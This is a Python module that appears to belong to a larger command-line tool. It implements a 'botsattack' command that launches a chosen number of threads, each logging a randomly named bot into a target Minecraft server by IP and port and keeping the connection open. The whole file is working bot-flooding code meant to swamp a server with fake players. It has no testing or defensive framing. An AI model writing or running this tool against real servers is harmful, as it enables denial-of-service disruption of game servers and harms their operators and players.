import time
import random
import string
import threading
from colorama import Fore, Style, init
from minecraft.networking.connection import Connection

init(autoreset=True)

def random_bot_name(prefix, minlen=4, maxlen=7):
    randlen = random.randint(minlen, maxlen)
    randpart = ''.join(random.choices(string.ascii_lowercase + string.digits, k=randlen))
    return prefix + randpart

def real_bot(ip, port, prefix, idx, MESSAGES, lang):
    name = random_bot_name(prefix)
    color = random.choice([
        Fore.LIGHTGREEN_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTYELLOW_EX
    ])
    try:
        conn = Connection(ip, port, username=name)
        conn.connect()
        print(f"{color}[BOT-{idx:03}] {MESSAGES[lang]['bot_connected'].format(name=name, ip=ip, port=port)}{Style.RESET_ALL}")
        while True:
            time.sleep(1) 
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + f"[BOT-{idx:03}] {MESSAGES[lang]['bot_disconnected_by_user'].format(name=name)}" + Style.RESET_ALL)
        try:
            conn.disconnect()
        except Exception:
            pass
    except Exception as e:
        print(f"{Fore.RED}[BOT-{idx:03}] {MESSAGES[lang]['bot_connection_failed'].format(name=name, error=e)}{Style.RESET_ALL}")

def botsattack_command(argstr="", MESSAGES=None, lang="tr"):
    args = argstr.strip().split()
    if len(args) < 2:
        print(Fore.RED + "[ERROR] " + MESSAGES[lang]["wrong_usage"] + Style.RESET_ALL)
        print(Fore.LIGHTYELLOW_EX + MESSAGES[lang]["botsattack_usage"] + Style.RESET_ALL)
        return

    ip = args[0]
    port = int(args[1])
    count = int(args[2]) if len(args) > 2 else 10

    prefix = input(Fore.LIGHTMAGENTA_EX + MESSAGES[lang]["enter_prefix"] + Style.RESET_ALL).strip()
    if not prefix:
        print(Fore.RED + "[ERROR] " + MESSAGES[lang]["prefix_empty"] + Style.RESET_ALL)
        return

    print(Fore.LIGHTRED_EX + MESSAGES[lang]["connecting_bots"].format(count=count, ip=ip, port=port, prefix=prefix) + Style.RESET_ALL)
    threads = []
    try:
        for i in range(count):
            t = threading.Thread(target=real_bot, args=(ip, port, prefix, i+1, MESSAGES, lang), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.10)
        print(Fore.LIGHTGREEN_EX + MESSAGES[lang]["all_bots_connected"] + Style.RESET_ALL)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.LIGHTRED_EX + "\n" + MESSAGES[lang]["disconnecting_all_bots"] + Style.RESET_ALL)
    finally:
        pass